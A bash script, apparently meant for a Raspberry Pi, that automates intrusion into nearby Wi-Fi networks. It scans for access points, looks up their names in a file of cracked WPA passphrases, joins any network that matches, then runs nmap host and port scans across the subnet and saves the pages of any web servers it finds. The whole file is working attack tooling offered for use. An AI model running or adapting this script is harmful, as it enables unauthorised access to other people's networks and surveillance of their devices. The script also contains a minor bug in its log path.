#!/bin/bash

probes=3					# num of times to probe local aps
localnetworks=""
homedir="/home/pi/recon"
hashfile="$homedir/cracked.txt"
logfile="$homedir/rc.log"

function log {
	echo "$(date +%Y%m%d_%H%M%S) - $1"
	echo "$(date +%Y%m%d_%H%M%S) - $1" >> logfile
}

# cleanup and validate if we have any hits, call recon if we do
function validate {
	found=$(cat $hashfile | cut -d ":" -f 3- | grep "$1" | tail -n 1)
	if [[ ! -z "$found" ]]; then
		log "Found $(echo "$found" | cut -d ":" -f 1) - starting network recon."
    recon "$found" 
		found=""
	fi	
}

# connect to ap, scan 
function recon {
  ap=$(echo "$1" | cut -d ":" -f 1)
  psk=$(echo "$1" | cut -d ":" -f 2)
  log "Connecting to $ap"	
  network=$(sudo wpa_cli -i wlan0 add_network)
  sudo wpa_cli -i wlan0 set_network "$network" key_mgmt WPA-PSK > /dev/null
  sudo wpa_cli -i wlan0 set_network "$network" ssid "\""$ap"\"" > /dev/null 
  sudo wpa_cli -i wlan0 set_network "$network" psk "\""$psk"\"" > /dev/null	
  join=$(sudo wpa_cli -i wlan0 select_network "$network")
  sleep 5
  if [ "$join" == "OK" ]; then
    log "$ap joined successfully."
		sleep 20    # give a little time for ap to issue ip
		hip="$(ip -o -4 addr list wlan0 | awk '{print $4}' | cut -d/ -f1)"
	  get_subnet "$hip"	
		log "IP is $hip, subnet is $subnet"
	  log "Scanning $subnet"
		scan_subnet $subnet
	  if [ ! -d "$homedir/$ap" ] ; then mkdir "$homedir/$ap"; fi	
		IFS=$'\n'
		for host in $fip
		do
			echo "$host" >> "$homedir/$ap/$ap.txt"
			scan_host_ports $host
			check_web $host
		done
	else
    log "ERROR: Issues joining $ap."
		sudo wpa_cli -i wlan0 remove_network "$network"	
    return	
	fi	
}

function get_subnet {
  subnet="$(echo $1 | cut -d "." -f1-3).0/24" 
  return 0 
  }

function scan_subnet {
  fip=$(sudo nmap -sn $subnet | grep -o '[0-9]\+[.][0-9]\+[.][0-9]\+[.][0-9]\+') 
	return 0 
	}

function scan_host_ports {
  sudo nmap $1 | grep 'open\|HOST\|MAC' >> "$homedir/$ap/$ap.txt"
  return	
  }

# pull some index pages if serving
function check_web {
  if nc -z -w5 $1 80 ; then wget -T 5 "http://$1:80/" -O "$homedir/$ap/$1-80.html"; fi 
  if nc -z -w5 $1 443 ; then wget -T 5 --no-check-certificate "https://$1:443/" -O "$homedir/$ap/$1-443.html"; fi
  return
	}

# install nmap
function check_prereqs {
  if ! which nmap >> /dev/null ; then
    echo "nmap not found, installing..."
    sudo apt-get -q -y install nmap >> /dev/null 
    if ! which nmap >> /dev/null ; then echo "Error installing nmap.  Exiting."; exit 1; else echo "nmap installed."; fi 
  fi
}

check_prereqs
log "Starting scan..."
log "Number of probes=$probes"
log "Cracked hash file is $hashfile ($(cat $hashfile | wc -l) entries)"

# generate local ap list
while [ $probes -ne 0 ]
do
  log "Finding local signals($probes)..."
  out=$(sudo iwlist wlan0 scan )
  # we miss hidden networks (wpa_cli needs ssid to generate psk hash)
  tmp=$(echo "$out" | grep 'ESSID'| cut -d ":" -f 2- | sed 's/"//g' | sed 's/\\x00//g' | sed '/^[[:space:]]*$/d')
  ct=$(echo "$tmp" |  wc -l)
  # store largest find from probes
  if [ $(echo "$tmp" | wc -l) -gt $(echo "$localnetworks" | wc -l) ] ;
	then
    localnetworks=$tmp
	fi
	sleep 5
	log "Found $ct access points."
	probes=$(( $probes - 1 ))	
done

log "Local access points:"
log "$localnetworks"
# trim whitespace
log "Checking access point list against hash file..."
IFS=$'\n'
for line in $localnetworks
do
  validate $line		# checks against hash file then invokes recon if found
done

log "Finished scan."